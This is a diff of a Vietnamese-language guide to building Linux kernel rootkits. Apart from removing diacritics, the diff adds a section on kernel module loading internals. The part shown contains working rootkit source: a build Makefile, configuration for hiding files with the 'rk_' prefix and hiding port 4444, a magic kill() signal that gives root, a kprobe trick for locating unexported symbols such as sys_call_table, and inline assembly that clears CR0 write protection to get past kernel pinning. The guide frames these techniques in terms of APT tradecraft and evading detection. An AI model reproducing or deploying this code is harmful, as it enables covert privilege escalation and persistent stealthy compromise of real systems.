@@ -1,19 +1,19 @@
 # Linux Kernel Rootkit — Complete Guide (All Techniques, Full Code)
 
-> Tài liệu toàn diện về Linux kernel rootkit engineering.
-> Mỗi kỹ thuật có **full compilable source code**, giải thích **từng dòng**, phân tích **tại sao APT chọn cách này**.
-> Code tested trên kernel 5.15 LTS / 6.1 LTS / 6.6 LTS.
+> Tai lieu toan dien ve Linux kernel rootkit engineering.
+> Moi ky thuat co **full compilable source code**, giai thich **tung dong**, phan tich **tai sao APT chon cach nay**.
+> Code tested tren kernel 5.15 LTS / 6.1 LTS / 6.6 LTS.
 >
 > **80 techniques** across 16 chapters + 11 appendices.
 > 3 rounds of adversarial audit — all fixes applied inline.
 
 ---
 
-## Mục lục tổng
+## Muc luc tong
 
 **Part I — Core Rootkit Engineering (Ch 1-5)**
 - Chapter 1: Kernel Module Framework
-- Chapter 2: Tìm sys_call_table — 6 phương pháp
+- Chapter 2: Tim sys_call_table — 6 phuong phap
 - Chapter 3: Syscall Table Hooking
 - Chapter 4: Ftrace-based Hooking
 - Chapter 5: Kprobe/Kretprobe Hooking
@@ -30,7 +30,7 @@
 - Chapter 12: Persistence — Survive Reboot
 - Chapter 13: Anti-Forensics & Self-Protection
 - Chapter 14: Covert Communication & C2
-- Chapter 15: Tổng hợp — Full-featured Rootkit
+- Chapter 15: Tong hop — Full-featured Rootkit
 - Chapter 16: Detection Engineering
 
 **Part IV — Advanced Techniques (Appendices A-G)**
@@ -57,46 +57,275 @@
 
 ## Chapter 1: Kernel Module Framework
 
-### 1.1 Makefile chuẩn cho rootkit development
+### 1.0 Kernel Module Internals — Hieu sau truoc khi viet code
 
-Makefile này hỗ trợ multi-file module, debug symbols, và cross-compilation.
+Truoc khi viet bat ky dong code nao, ban can hieu kernel module la gi, no duoc load vao kernel nhu the nao, va memory layout cua no tren x86-64. Phan nay giai thich chi tiet tung buoc tu luc user goi `insmod` den khi module code bat dau chay.
+
+#### LKM la gi? LKM vs Built-in
+
+Linux kernel ho tro hai cach de them code vao kernel:
+
+1. **Built-in (vmlinux)**: Code duoc compile truc tiep vao kernel image. Ton tai vinh vien trong kernel memory tu luc boot. De thay doi phai recompile va reboot. Cac subsystem core nhu scheduler, memory manager la built-in.
+
+2. **Loadable Kernel Module (LKM)**: Code duoc compile thanh file `.ko` rieng biet, load vao kernel TAI RUNTIME bang `insmod` hoac `modprobe`. Co the unload bang `rmmod`. Day la co che rootkit su dung de inject code vao running kernel ma khong can reboot.
+
+File `.ko` thuc chat la mot **ELF relocatable object** (giong file `.o` nhung voi metadata bo sung). Kernel build system tao `.ko` bang cach:
+- Compile moi `.c` thanh `.o` (object files)
+- Link cac `.o` lai thanh mot `.o` duy nhat
+- Them section `.modinfo` chua module metadata (license, author, description, version magic)
+- Them section `.gnu.linkonce.this_module` chua struct `module` da khoi tao mot phan
+- Output file `.ko` la ELF voi cac sections dac biet nay
+
+Ban co the xem cau truc voi `readelf -S module.ko` — se thay cac sections nhu `.text`, `.rodata`, `.data`, `.bss`, `.modinfo`, `.symtab`, va nhung section kernel-specific.
+
+#### Qua trinh loading module: Tu insmod den module_init()
+
+Khi user goi `insmod rk.ko`, day la chuoi su kien dien ra:
+
+```
+User space:                        Kernel space:
+                                   
+  insmod rk.ko                     
+    |                              
+    v                              
+  open("rk.ko", O_RDONLY)         
+  read() -> doc toan bo file      
+  vao userspace buffer             
+    |                              
+    v                              
+  init_module(buf, len, params)    --> sys_init_module()
+    (hoac finit_module(fd, ...))       |
+                                       v
+                                   load_module()
+                                       |
+                                       v
+                                   1. layout_and_allocate()
+                                   |  - Parse ELF headers
+                                   |  - Tinh toan memory layout
+                                   |  - module_alloc() cap phat vung nho
+                                   |    trong MODULE_VADDR range
+                                   |  - Copy sections vao kernel memory
+                                   |
+                                   v
+                                   2. find_module_sections()
+                                   |  - Tim .modinfo, __ksymtab,
+                                   |    __kcrctab, .init.text, .exit.text
+                                   |  - Parse cac section dac biet
+                                   |
+                                   v
+                                   3. check_modinfo() & check_version()
+                                   |  - Verify vermagic string
+                                   |  - So sanh kernel version, SMP, preempt
+                                   |  - Neu mismatch -> tu choi load
+                                   |
+                                   v
+                                   4. simplify_symbols() + apply_relocations()
+                                   |  - Resolve undefined symbols
+                                   |    (tim address trong kernel symtab)
+                                   |  - Apply ELF relocations
+                                   |    (fix addresses trong code)
+                                   |
+                                   v
+                                   5. post_relocation()
+                                   |  - Sort exception tables
+                                   |  - Setup module unwind info
+                                   |
+                                   v
+                                   6. complete_formation()
+                                   |  - Set memory permissions:
+                                   |    .text -> RX (read + execute)
+                                   |    .rodata -> RO (read only)
+                                   |    .data -> RW (read + write)
+                                   |  - Add vao module list (modules linked list)
+                                   |  - Tao sysfs entries (/sys/module/NAME/)
+                                   |
+                                   v
+                                   7. do_init_module()
+                                      - Goi module->init() callback
+                                        (= function ban dang ky voi module_init())
+                                      - Neu init() return 0 -> thanh cong
+                                      - Neu init() return < 0 -> free module, fail
+                                      - Free .init.text section (khong can nua)
+```
+
+Source code chinh: `kernel/module/main.c` (kernel 6.x) hoac `kernel/module.c` (kernel < 6.0).
+
+#### struct module — Trai tim cua moi loaded module
+
+Moi module trong kernel duoc dai dien boi mot `struct module`. Day la struct lon (~500 bytes tren x86-64) chua moi thong tin kernel can de quan ly module:
+
+```
+struct module layout (simplified, kernel 6.x):
++-----------------------------------------------------------+
+| name[MODULE_NAME_LEN]    "rk\0..."                        | Offset +0
+|   Ten module, max 56 chars (MODULE_NAME_LEN = 56)         |
++-----------------------------------------------------------+
+| state                     MODULE_STATE_LIVE / GOING / etc  | +56
+|   Trang thai: LIVE (dang chay), GOING (dang unload),       |
+|   COMING (dang load)                                       |
++-----------------------------------------------------------+
+| list (struct list_head)   { *next, *prev }                 | +60
+|   Doubly-linked list ket noi TAT CA modules.               |
+|   lsmod iterate list nay. list_del() = an module.          |
++-----------------------------------------------------------+
+| init                      pointer -> module_init function  | +76
+|   Callback khi load. Set boi module_init() macro.          |
+|   Duoc free sau khi init() return.                         |
++-----------------------------------------------------------+
+| exit                      pointer -> module_exit function  | +84
+|   Callback khi unload. Set boi module_exit() macro.        |
++-----------------------------------------------------------+
+| mkobj (struct module_kobject)                              | +92
+|   Kernel object cho sysfs integration.                     |
+|   Tao /sys/module/NAME/ directory.                         |
+|   Rootkit can remove kobject de an khoi sysfs.             |
++-----------------------------------------------------------+
+| sect_attrs                                                 | +...
+|   Section attributes, hien thi tai                         |
+|   /sys/module/NAME/sections/                               |
+|   Chua address cua moi section -> info leak risk           |
++-----------------------------------------------------------+
+| core_layout (struct module_layout)                         |
+|   .base  = base address cua module trong kernel memory     |
+|   .size  = tong kich thuoc                                 |
+|   .text_size = kich thuoc code section                     |
+|   .ro_size   = kich thuoc read-only section                |
++-----------------------------------------------------------+
+| init_layout (struct module_layout)                         |
+|   Tuong tu core_layout nhung cho .init sections.           |
+|   Duoc free sau khi init() chay xong.                      |
++-----------------------------------------------------------+
+| syms, num_syms                                             |
+|   Exported symbols (EXPORT_SYMBOL). Kernel modules khac    |
+|   co the goi functions duoc export.                        |
++-----------------------------------------------------------+
+| ... (nhieu fields khac: GPL syms, kprobes, tracepoints,    |
+|      jump labels, bug table, exception table, etc.)        |
++-----------------------------------------------------------+
+```
+
+Luu y quan trong: `list_head` la co che rootkit dung de an module (Chapter 6). Khi ban goi `list_del(&THIS_MODULE->list)`, module bi go khoi linked list -> `lsmod` khong thay nua. Nhung module code VAN nam trong memory va VAN chay.
+
+#### Memory: Module duoc load o dau?
+
+`module_alloc()` cap phat memory cho module code. Tren x86-64, function nay dung `__vmalloc_node_range()` de cap phat trong vung MODULE_VADDR:
+
+```
+x86-64 Kernel Virtual Address Space Layout (48-bit, 4-level paging):
+======================================================================
+
+0xFFFFFFFFFFFFFFFF  +---------------------------+  Top of virtual memory
+                    |                           |
+0xFFFFFFFF80000000  | Kernel text (.text)       |  Direct-mapped kernel image
+         __START_   | Kernel data (.data/.bss)  |  Size: ~16MB typical
+         KERNEL_map | sys_call_table, IDT, etc  |  = where vmlinux lives
+                    |                           |
+0xFFFFFFFE80000000  +---------------------------+
+                    |   (hole)                  |
+0xFFFFC90000000000  +---------------------------+  VMALLOC_START
+                    |   vmalloc / ioremap area  |
+                    |   ....                    |
+                    |   MODULE_VADDR range      |  <-- Modules loaded HERE
+                    |   (modules, BPF JIT,      |  module_alloc() uses this
+                    |    ioremap mappings)       |
+                    |   ....                    |
+0xFFFFE8FFFFFFFFFF  +---------------------------+  VMALLOC_END
+                    |   (hole)                  |
+0xFFFF888000000000  +---------------------------+  PAGE_OFFSET
+                    |  Direct physical mapping  |  1:1 map of all physical RAM
+                    |  (page_offset_base)       |  phys_to_virt() uses this
+                    |  Covers all physical RAM  |
+0xFFFF800000000000  +---------------------------+
+                    |   (hole/guard)            |
+                    |                           |
+- - - - - - - - - -  Canonical hole  - - - - - - (bits [63:48] must match)
+                    |                           |
+0x00007FFFFFFFFFFF  +---------------------------+  Top of userspace
+                    |  Stack (grows down)       |
+                    |  ....                     |
+                    |  mmap / shared libs       |
+                    |  Heap (grows up)          |
+                    |  .data / .bss             |
+                    |  .text                    |
+0x0000000000000000  +---------------------------+  NULL page (unmapped)
+```
+
+Module code nam trong vmalloc area nen co properties dac biet:
+- Pages KHONG lien tuc ve physical (vmalloc map tung page rieng le)
+- Execute permission duoc bat cho text section (cac kernel moi dung `set_memory_x()`)
+- Dia chi thay doi moi lan load (KASLR cho modules rieng, khong phu thuoc kernel KASLR base)
+
+Luu y voi **KASLR** (Kernel Address Space Layout Randomization): kernel image duoc load tai randomized base address, aligned 2MB. Cac address tren la defaults — thuc te duoc offset boi random value. Module addresses cung thay doi do vmalloc base duoc randomize.
+
+#### Symbol Export va Resolution
+
+Khi ban viet `EXPORT_SYMBOL(my_function)` hoac `EXPORT_SYMBOL_GPL(my_function)` trong kernel code, compiler tao mot entry trong section `__ksymtab`:
+
+```
+Section __ksymtab:
++------------------+------------------+
+| symbol address   | symbol name ptr  |  <- moi entry la struct kernel_symbol
++------------------+------------------+
+| 0xffffffff8123.. | "commit_creds"   |
++------------------+------------------+
+| 0xffffffff8124.. | "prepare_creds"  |
++------------------+------------------+
+| ...              | ...              |
++------------------+------------------+
+```
+
+Khi module duoc load, `simplify_symbols()` trong load_module() resolve moi undefined symbol:
+1. Tim symbol name trong `__ksymtab` cua kernel (vmlinux)
+2. Tim trong `__ksymtab` cua cac modules da loaded
+3. Neu tim thay -> ghi address vao module's symbol table
+4. Neu khong tim thay -> load FAIL voi "Unknown symbol" error
+
+Day la ly do `kallsyms_lookup_name()` bi unexport tu kernel 5.7: khi function khong nam trong `__ksymtab`, modules khong the reference no truc tiep. Rootkit phai dung kprobe trick hoac memory scanning de tim address.
+
+Module cua ban co the export symbols cho modules khac bang `EXPORT_SYMBOL()`. Nhung rootkit KHONG nen lam dieu nay vi no tao fingerprint de detect.
+
+---
+
+### 1.1 Makefile chuan cho rootkit development
+
+Makefile nay ho tro multi-file module, debug symbols, va cross-compilation.
 
 ```makefile
 # Makefile — Production-grade cho kernel module development
 #
-# Cách dùng:
-#   make                    → Build module cho kernel đang chạy
-#   make KDIR=/path/to/src  → Build cho kernel khác
-#   make debug              → Build với debug symbols
-#   make clean              → Dọn dẹp
+# Cach dung:
+#   make                    -> Build module cho kernel dang chay
+#   make KDIR=/path/to/src  -> Build cho kernel khac
+#   make debug              -> Build voi debug symbols
+#   make clean              -> Don dep
 
-# Tên module output — thay đổi tên này cho mỗi project
+# Ten module output — thay doi ten nay cho moi project
 MODULE_NAME := rk
 
-# Source files — thêm .o cho mỗi .c file
-# Khi build multi-file module, kernel build system sẽ:
-#   1. Compile mỗi .o từ .c tương ứng
-#   2. Link tất cả vào $(MODULE_NAME).ko
+# Source files — them .o cho moi .c file
+# Khi build multi-file module, kernel build system se:
+#   1. Compile moi .o tu .c tuong ung
+#   2. Link tat ca vao $(MODULE_NAME).ko
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := main.o hooks.o hide.o netfilter.o util.o
 
-# Kernel build directory — nơi chứa kernel headers + build system
-# Mặc định = kernel đang chạy, override bằng KDIR=
+# Kernel build directory — noi chua kernel headers + build system
+# Mac dinh = kernel dang chay, override bang KDIR=
 KDIR ?= /lib/modules/$(shell uname -r)/build
 
-# Thư mục source hiện tại
+# Thu muc source hien tai
 PWD := $(shell pwd)
 
-# Compiler flags bổ sung
+# Compiler flags bo sung
 # -DDEBUG : enable pr_debug() output
-# -Werror : warning = error, tránh bug subtle
+# -Werror : warning = error, tranh bug subtle
 ccflags-y := -Wall -Wextra -Wno-unused-parameter
 
-# Target mặc định
+# Target mac dinh
 all:
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
 
-# Build với debug info (không strip symbols)
+# Build voi debug info (khong strip symbols)
 debug: ccflags-y += -DDEBUG -g -O0
 debug:
 	$(MAKE) -C $(KDIR) M=$(PWD) modules
@@ -105,7 +334,7 @@ clean:
 	$(MAKE) -C $(KDIR) M=$(PWD) clean
 	rm -f Module.symvers modules.order
 
-# Cài module vào /lib/modules/$(uname -r)/extra/
+# Cai module vao /lib/modules/$(uname -r)/extra/
 install:
 	$(MAKE) -C $(KDIR) M=$(PWD) modules_install
 	depmod -a
@@ -116,11 +345,11 @@ install:
 ### 1.2 Header chung — Shared definitions
 
 ```c
-/* rootkit.h — Header chung cho tất cả source files
+/* rootkit.h — Header chung cho tat ca source files
  *
- * Mọi constant, struct, function prototype đều khai báo ở đây.
- * Tách header riêng vì rootkit thường có nhiều file .c
- * mỗi file đảm nhận một subsystem (hook, hide, net, ...).
+ * Moi constant, struct, function prototype deu khai bao o day.
+ * Tach header rieng vi rootkit thuong co nhieu file .c
+ * moi file dam nhan mot subsystem (hook, hide, net, ...).
  */
 
 #ifndef _ROOTKIT_H
@@ -130,7 +359,7 @@ install:
 #include <linux/module.h>     /* MODULE_*, module_init/exit */
 #include <linux/kernel.h>     /* printk, pr_info, pr_err */
 #include <linux/syscalls.h>   /* __NR_* syscall numbers */
-#include <linux/kallsyms.h>   /* kallsyms_lookup_name (nếu available) */
+#include <linux/kallsyms.h>   /* kallsyms_lookup_name (neu available) */
 #include <linux/dirent.h>     /* linux_dirent64 struct */
 #include <linux/namei.h>      /* kern_path, path_put */
 #include <linux/fs.h>         /* file_operations, inode_operations */
@@ -146,55 +375,55 @@ install:
 #include <linux/sched/signal.h> /* for_each_process */
 #include <linux/tcp.h>        /* TCP structures */
 #include <linux/string.h>     /* kernel string functions */
-#include <asm/paravirt.h>     /* read_cr0 trên paravirt */
+#include <asm/paravirt.h>     /* read_cr0 tren paravirt */
 #include <asm/processor.h>    /* CR0 bit definitions */
 
 /* ──────────────────────────────────────────────────────────────
- * CONFIGURATION — Thay đổi theo nhu cầu
+ * CONFIGURATION — Thay doi theo nhu cau
  * ────────────────────────────────────────────────────────────── */
 
-/* Prefix cho file/directory cần ẩn.
- * Bất kỳ entry nào có tên bắt đầu bằng prefix này sẽ invisible
- * cho ls, find, và bất kỳ chương trình nào dùng getdents64. */
+/* Prefix cho file/directory can an.
+ * Bat ky entry nao co ten bat dau bang prefix nay se invisible
+ * cho ls, find, va bat ky chuong trinh nao dung getdents64. */
 #define HIDDEN_PREFIX    "rk_"
 
-/* Signal number dùng làm magic trigger.
- * SIGRTMIN+20 = signal 54 trên hầu hết hệ thống.
- * Tại sao real-time signal: vì application bình thường không dùng,
- * giảm false positive trigger. */
+/* Signal number dung lam magic trigger.
+ * SIGRTMIN+20 = signal 54 tren hau het he thong.
+ * Tai sao real-time signal: vi application binh thuong khong dung,
+ * giam false positive trigger. */
 #define MAGIC_SIGNAL     54
 
-/* PID dùng trong kill() để trigger give-root.
- * kill(MAGIC_PID, MAGIC_SIGNAL) → current process trở thành root.
- * Dùng PID lớn bất thường để tránh trùng PID thật. */
+/* PID dung trong kill() de trigger give-root.
+ * kill(MAGIC_PID, MAGIC_SIGNAL) -> current process tro thanh root.
+ * Dung PID lon bat thuong de tranh trung PID that. */
 #define MAGIC_PID        31337
 
 /* Module visibility toggle PID.
- * kill(HIDE_MODULE_PID, MAGIC_SIGNAL) → ẩn/hiện module. */
+ * kill(HIDE_MODULE_PID, MAGIC_SIGNAL) -> an/hien module. */
 #define HIDE_MODULE_PID  31338
 
-/* Port cần ẩn khỏi netstat/ss */
+/* Port can an khoi netstat/ss */
 #define HIDDEN_PORT      4444
 
 /* ──────────────────────────────────────────────────────────────
  * COMPATIBILITY MACROS
  *
- * Kernel API thay đổi liên tục. Những macro này cho phép cùng
- * một codebase compile trên nhiều kernel versions.
+ * Kernel API thay doi lien tuc. Nhung macro nay cho phep cung
+ * mot codebase compile tren nhieu kernel versions.
  * ────────────────────────────────────────────────────────────── */
 
-/* Kernel 4.17+ chuyển syscall handler sang dùng struct pt_regs *
- * thay vì nhận arguments trực tiếp.
+/* Kernel 4.17+ chuyen syscall handler sang dung struct pt_regs *
+ * thay vi nhan arguments truc tiep.
  * 
- * Trước 4.17:  long sys_kill(pid_t pid, int sig)
- * Từ 4.17+:    long __x64_sys_kill(const struct pt_regs *regs)
- *              Với regs->di = pid, regs->si = sig
+ * Truoc 4.17:  long sys_kill(pid_t pid, int sig)
+ * Tu 4.17+:    long __x64_sys_kill(const struct pt_regs *regs)
+ *              Voi regs->di = pid, regs->si = sig
  *
- * Macro SYSCALL_PREFIX giúp tạo đúng tên function. */
+ * Macro SYSCALL_PREFIX giup tao dung ten function. */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
   #define SYSCALL_PREFIX "__x64_sys_"
-  /* Trên kernel mới, syscall handlers nhận pt_regs *.
-   * Arguments nằm trong registers:
+  /* Tren kernel moi, syscall handlers nhan pt_regs *.
+   * Arguments nam trong registers:
    *   regs->di = arg1 (rdi)
    *   regs->si = arg2 (rsi)
    *   regs->dx = arg3 (rdx)
@@ -204,22 +433,22 @@ install:
   typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
 #else
   #define SYSCALL_PREFIX "sys_"
-  /* Trên kernel cũ, syscall handlers nhận args trực tiếp. */
+  /* Tren kernel cu, syscall handlers nhan args truc tiep. */
 #endif
 
 /* Kernel 5.7+ unexport kallsyms_lookup_name.
- * Trước đó có thể gọi trực tiếp:
+ * Truoc do co the goi truc tiep:
  *   unsigned long addr = kallsyms_lookup_name("sys_call_table");
- * Từ 5.7 trở đi phải dùng kprobe trick (xem Chapter 2). */
+ * Tu 5.7 tro di phai dung kprobe trick (xem Chapter 2). */
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
   #define KPROBE_LOOKUP 1
 #endif
 
-/* Kernel 6.2+ đổi cách set CR0 — native_write_cr0 bị unexport.
- * Phải dùng inline assembly trực tiếp. */
+/* Kernel 6.2+ doi cach set CR0 — native_write_cr0 bi unexport.
+ * Phai dung inline assembly truc tiep. */
 
 /* ──────────────────────────────────────────────────────────────
- * FUNCTION PROTOTYPES — Khai báo cho các module files
+ * FUNCTION PROTOTYPES — Khai bao cho cac module files
  * ────────────────────────────────────────────────────────────── */
 
 /* util.c — Utility functions */
@@ -245,14 +474,14 @@ void rk_net_cleanup(void);
 #endif /* _ROOTKIT_H */
 ```
 
-### 1.3 Utility Functions — Nền tảng kỹ thuật
+### 1.3 Utility Functions — Nen tang ky thuat
 
 ```c
-/* util.c — Core utility functions mà mọi technique đều cần
+/* util.c — Core utility functions ma moi technique deu can
  *
- * File này chứa những building blocks:
- * 1. Symbol lookup (tìm address của kernel function/variable)
- * 2. Memory protection toggle (để ghi vào read-only pages)
+ * File nay chua nhung building blocks:
+ * 1. Symbol lookup (tim address cua kernel function/variable)
+ * 2. Memory protection toggle (de ghi vao read-only pages)
  * 3. Helper functions chung
  */
 
@@ -261,70 +490,70 @@ void rk_net_cleanup(void);
 /* ══════════════════════════════════════════════════════════════
  * SYMBOL LOOKUP
  *
- * Đây là thao tác cơ bản nhất: tìm address của symbol trong kernel.
- * "Symbol" = function name hoặc variable name.
- * Ví dụ: tìm address của sys_call_table, commit_creds, etc.
+ * Day la thao tac co ban nhat: tim address cua symbol trong kernel.
+ * "Symbol" = function name hoac variable name.
+ * Vi du: tim address cua sys_call_table, commit_creds, etc.
  *
- * Tại sao cần: kernel không export mọi symbol cho modules.
- * sys_call_table là unexported symbol — module không thể dùng
- * trực tiếp. Phải tự tìm address bằng các trick.
+ * Tai sao can: kernel khong export moi symbol cho modules.
+ * sys_call_table la unexported symbol — module khong the dung
+ * truc tiep. Phai tu tim address bang cac trick.
  *
- * KASLR (Kernel Address Space Layout Randomization) khiến address
- * thay đổi mỗi lần boot → KHÔNG thể hardcode address.
+ * KASLR (Kernel Address Space Layout Randomization) khien address
+ * thay doi moi lan boot -> KHONG the hardcode address.
  * ══════════════════════════════════════════════════════════════ */
 
 #ifdef KPROBE_LOOKUP
 /*
- * Kprobe Trick — Phương pháp chính cho kernel >= 5.7
+ * Kprobe Trick — Phuong phap chinh cho kernel >= 5.7
  *
- * Bối cảnh:
+ * Boi canh:
  *   Kernel 5.7 commit b80e44d... unexport kallsyms_lookup_name().
- *   Lý do: giảm attack surface — module không nên tìm arbitrary symbols.
- *   Nhưng kprobes API vẫn cần resolve symbols internally.
+ *   Ly do: giam attack surface — module khong nen tim arbitrary symbols.
+ *   Nhung kprobes API van can resolve symbols internally.
  *
  * Trick:
- *   1. register_kprobe() nhận .symbol_name = "target_function"
- *   2. Kernel tự resolve symbol name → address (dùng kallsyms internally)
+ *   1. register_kprobe() nhan .symbol_name = "target_function"
+ *   2. Kernel tu resolve symbol name -> address (dung kallsyms internally)
  *   3. Sau register, kp.addr = resolved address
- *   4. Unregister ngay — ta chỉ cần address, không cần probe
+ *   4. Unregister ngay — ta chi can address, khong can probe
  *
- * Tại sao hoạt động:
- *   register_kprobe() gọi kprobe_lookup_name() nội bộ,
- *   function này vẫn access kallsyms. Kernel team chưa block
- *   vector này (tính đến kernel 6.8).
+ * Tai sao hoat dong:
+ *   register_kprobe() goi kprobe_lookup_name() noi bo,
+ *   function nay van access kallsyms. Kernel team chua block
+ *   vector nay (tinh den kernel 6.8).
  *
- * Giới hạn:
- *   CONFIG_KPROBES=y phải được bật (mặc định trên hầu hết distros).
- *   Một số kernel lockdown modes chặn kprobes.
+ * Gioi han:
+ *   CONFIG_KPROBES=y phai duoc bat (mac dinh tren hau het distros).
+ *   Mot so kernel lockdown modes chan kprobes.
  */
 static unsigned long kprobe_lookup(const char *name)
 {
     struct kprobe kp = {
-        .symbol_name = name    /* Tên symbol cần tìm */
+        .symbol_name = name    /* Ten symbol can tim */
     };
     unsigned long addr;
     int ret;
 
     ret = register_kprobe(&kp);
     if (ret < 0) {
-        /* Có thể fail vì:
-         * - Symbol không tồn tại (typo, kernel version khác)
+        /* Co the fail vi:
+         * - Symbol khong ton tai (typo, kernel version khac)
          * - CONFIG_KPROBES=n
-         * - Kernel lockdown mode chặn kprobes
-         * - Symbol nằm trong __init section (đã freed sau boot) */
+         * - Kernel lockdown mode chan kprobes
+         * - Symbol nam trong __init section (da freed sau boot) */
         pr_err("rk: kprobe register failed for %s: %d\n", name, ret);
         return 0;
     }
 
-    /* kp.addr bây giờ chứa address đã resolve.
-     * Cast sang unsigned long vì ta dùng nó như raw address. */
+    /* kp.addr bay gio chua address da resolve.
+     * Cast sang unsigned long vi ta dung no nhu raw address. */
     addr = (unsigned long)kp.addr;
 
-    /* Unregister ngay — ta không thực sự muốn probe function này.
-     * Để kprobe registered sẽ:
-     * 1. Tốn resource (mỗi kprobe chèn breakpoint vào code)
-     * 2. Gây chậm (breakpoint = trap mỗi lần function chạy)
-     * 3. Dễ bị detect (admin list kprobes → thấy ngay) */
+    /* Unregister ngay — ta khong thuc su muon probe function nay.
+     * De kprobe registered se:
+     * 1. Ton resource (moi kprobe chen breakpoint vao code)
+     * 2. Gay cham (breakpoint = trap moi lan function chay)
+     * 3. De bi detect (admin list kprobes -> thay ngay) */
     unregister_kprobe(&kp);
 
     return addr;
@@ -334,12 +563,12 @@ static unsigned long kprobe_lookup(const char *name)
 /*
  * rk_lookup_name() — Unified symbol lookup interface
  *
- * Wraps phương pháp phù hợp tùy kernel version:
- * - Kernel < 5.7: dùng kallsyms_lookup_name() trực tiếp
- * - Kernel >= 5.7: dùng kprobe trick
+ * Wraps phuong phap phu hop tuy kernel version:
+ * - Kernel < 5.7: dung kallsyms_lookup_name() truc tiep
+ * - Kernel >= 5.7: dung kprobe trick
  *
- * Input:  name = tên symbol (e.g., "sys_call_table")
- * Output: virtual address của symbol, hoặc 0 nếu không tìm thấy
+ * Input:  name = ten symbol (e.g., "sys_call_table")
+ * Output: virtual address cua symbol, hoac 0 neu khong tim thay
  */
 unsigned long rk_lookup_name(const char *name)
 {
@@ -354,56 +583,56 @@ unsigned long rk_lookup_name(const char *name)
  * MEMORY PROTECTION TOGGLE
  *
  * Context:
- *   Kernel text và data quan trọng (như sys_call_table) nằm trong
+ *   Kernel text va data quan trong (nhu sys_call_table) nam trong
  *   read-only memory pages. Khi CONFIG_STRICT_KERNEL_RWX=y
- *   (mặc định trên mọi distro), ghi vào sẽ gây page fault → crash.
+ *   (mac dinh tren moi distro), ghi vao se gay page fault -> crash.
  *
  * CR0 register (Control Register 0):
  *   Bit 16 = WP (Write Protect)
  *   - WP=1: CPU enforce page-level write protection
- *           Ring 0 code KHÔNG được ghi vào read-only pages
- *   - WP=0: Ring 0 code CÓ THỂ ghi vào read-only pages
- *           (Ring 3 vẫn bị chặn)
+ *           Ring 0 code KHONG duoc ghi vao read-only pages
+ *   - WP=0: Ring 0 code CO THE ghi vao read-only pages
+ *           (Ring 3 van bi chan)
  *
  * Flow:
- *   1. rk_unprotect_memory(): clear CR0.WP → cho phép ghi
- *   2. Thực hiện ghi (ví dụ: thay syscall table entry)
- *   3. rk_protect_memory(): set CR0.WP → bật lại protection
+ *   1. rk_unprotect_memory(): clear CR0.WP -> cho phep ghi
+ *   2. Thuc hien ghi (vi du: thay syscall table entry)
+ *   3. rk_protect_memory(): set CR0.WP -> bat lai protection
  *
  * SMP concerns:
- *   CR0 là per-CPU register. Mỗi CPU core có CR0 riêng.
- *   Nếu chỉ clear WP trên CPU hiện tại, core khác vẫn enforced.
- *   Trong practice, ta chỉ cần clear trên CPU đang chạy code này,
- *   vì ghi syscall table là atomic (sizeof pointer = 8 bytes).
+ *   CR0 la per-CPU register. Moi CPU core co CR0 rieng.
+ *   Neu chi clear WP tren CPU hien tai, core khac van enforced.
+ *   Trong practice, ta chi can clear tren CPU dang chay code nay,
+ *   vi ghi syscall table la atomic (sizeof pointer = 8 bytes).
  *
  * Detection risk:
- *   Thay đổi CR0 rất dễ detect:
+ *   Thay doi CR0 rat de detect:
  *   - LKRG monitor CR0 changes
- *   - Hardware performance counters có thể flag
- *   - Giữ WP=0 lâu = security violation detectable
- *   Nên unprotect → write → protect càng nhanh càng tốt.
+ *   - Hardware performance counters co the flag
+ *   - Giu WP=0 lau = security violation detectable
+ *   Nen unprotect -> write -> protect cang nhanh cang tot.
  *
- * Alternative (hiện đại hơn): 
- *   set_memory_rw()/set_memory_ro() — thay đổi page table thay vì CR0.
- *   An toàn hơn nhưng cần biết page-aligned address.
- *   Xem phần sau.
+ * Alternative (hien dai hon): 
+ *   set_memory_rw()/set_memory_ro() — thay doi page table thay vi CR0.
+ *   An toan hon nhung can biet page-aligned address.
+ *   Xem phan sau.
  * ══════════════════════════════════════════════════════════════ */
 
 /*
- * Inline assembly để ghi CR0 trực tiếp.
+ * Inline assembly de ghi CR0 truc tiep.
  *
- * Tại sao inline asm thay vì native_write_cr0():
- *   Kernel 5.3+ thêm pinning cho CR0.WP bit trong native_write_cr0():
- *   nếu detect code cố clear WP, kernel WARN và set lại.
- *   Bằng cách dùng inline asm, ta bypass check này.
+ * Tai sao inline asm thay vi native_write_cr0():
+ *   Kernel 5.3+ them pinning cho CR0.WP bit trong native_write_cr0():
+ *   neu detect code co clear WP, kernel WARN va set lai.
+ *   Bang cach dung inline asm, ta bypass check nay.
  *
- *   "mov %0, %%cr0" : load giá trị từ biến C vào CR0
- *   "r"(val)         : val nằm trong bất kỳ general register nào
+ *   "mov %0, %%cr0" : load gia tri tu bien C vao CR0
+ *   "r"(val)         : val nam trong bat ky general register nao
  *   "memory"         : compiler barrier — flush pending writes
  *
- * CẢNH BÁO: từ kernel 6.2+, một số config bổ sung thêm check
- * bằng hardware (CR0 pinning via hypervisor). Nếu chạy trong VM
- * có hypervisor protection, trick này có thể fail.
+ * CANH BAO: tu kernel 6.2+, mot so config bo sung them check
+ * bang hardware (CR0 pinning via hypervisor). Neu chay trong VM
+ * co hypervisor protection, trick nay co the fail.
  */
 void rk_write_cr0(unsigned long val)
 {
@@ -411,36 +640,36 @@ void rk_write_cr0(unsigned long val)
 }
 
 /*
- * Tắt write protection — cho phép ghi vào read-only kernel memory.
+ * Tat write protection — cho phep ghi vao read-only kernel memory.
  *
- * CRITICAL SECTION: từ lúc gọi function này đến lúc gọi
- * rk_protect_memory(), kernel memory KHÔNG ĐƯỢC BẢO VỆ.
- * Bất kỳ bug nào ghi vào wrong address = kernel corruption.
+ * CRITICAL SECTION: tu luc goi function nay den luc goi
+ * rk_protect_memory(), kernel memory KHONG DUOC BAO VE.
+ * Bat ky bug nao ghi vao wrong address = kernel corruption.
  *
- * preempt_disable(): ngăn scheduler switch task trên CPU này.
- * Tại sao: nếu bị preempt trong khi WP=0, task khác chạy
- * với WP=0 có thể gây unpredictable behavior.
- * Và nếu bị migrate sang CPU khác, CR0 của CPU cũ vẫn WP=0.
+ * preempt_disable(): ngan scheduler switch task tren CPU nay.
+ * Tai sao: neu bi preempt trong khi WP=0, task khac chay
+ * voi WP=0 co the gay unpredictable behavior.
